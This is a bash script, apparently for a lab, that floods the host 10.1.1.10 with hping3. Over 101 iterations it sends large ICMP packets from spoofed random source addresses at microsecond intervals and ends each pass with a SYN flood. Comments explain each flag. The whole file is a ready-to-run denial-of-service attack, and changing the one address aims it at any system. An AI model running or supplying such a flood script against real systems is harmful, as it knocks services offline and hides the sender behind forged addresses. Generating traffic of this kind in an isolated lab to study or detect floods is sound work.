#!/bin/bash
for i in {200..300}
do
   ping -c1 10.1.1.10
   hping3 -1 --rand-source -i u1000  -c 1500 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u1500  -c 1500 10.1.1.10  --data 10000
   hping3 -1 --rand-source -i u2000  -c 1500 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u2500  -c 1500 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u3000  -c 1500 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u3500  -c 1500 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u4000  -c 1500 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u4500  -c 1000 10.1.1.10 --data 10000
   hping3 -1 --rand-source -i u5000  -c 1000 10.1.1.10 --data 10000
   hping3  --rand-source  -S -i u5000  -c 1000 10.1.1.10 --data 10000

done

# -1 : ICMP Mode
# --rand-source : random source address
# -i : interval uX where X is microseconds
# -c : packet count
# -S syn flag